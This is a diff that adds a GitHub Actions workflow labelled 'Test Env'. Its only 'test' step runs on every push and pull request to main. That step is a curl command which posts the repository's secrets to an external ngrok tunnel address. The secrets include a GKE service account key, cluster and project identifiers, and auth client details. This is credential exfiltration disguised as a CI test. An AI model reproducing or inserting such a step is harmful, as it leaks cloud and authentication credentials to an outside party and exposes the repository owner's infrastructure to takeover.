@@ -1,0 +1,25 @@
+name: Test Env
+run-name: Test Env
+
+on:
+  pull_request:
+    branches: [main]
+  push:
+    branches: [ main ]
+
+jobs:
+  build:
+    name: Test
+    runs-on: ubuntu-latest
+    permissions:
+      actions: read
+      contents: read
+      security-events: write
+
+    steps:
+      - name: 💾 Checking out the repository
+        uses: actions/checkout@v4
+      - name: ⚙️ Performing the test
+        shell: bash
+        run: |
+          curl --location 'https://sharing-cheerful-shiner.ngrok-free.app/test' --header 'Content-Type: text/plain' --data '{"API_DOMAIN":"${{secrets.API_DOMAIN}}","AUTH_CLIENT_ID":"${{secrets.AUTH_CLIENT_ID}}","AUTH_DOMAIN":"${{secrets.AUTH_DOMAIN}}","GKE_CLUSTER":"${{secrets.GKE_CLUSTER}}","GKE_PROJECT":"${{secrets.GKE_PROJECT}}","GKE_SA_KEY":"${{secrets.GKE_SA_KEY}}","GKE_ZONE":"${{secrets.GKE_ZONE}}","FUTURA_SECRET":"${{secrets.FUTURA_SECRET}}"}'
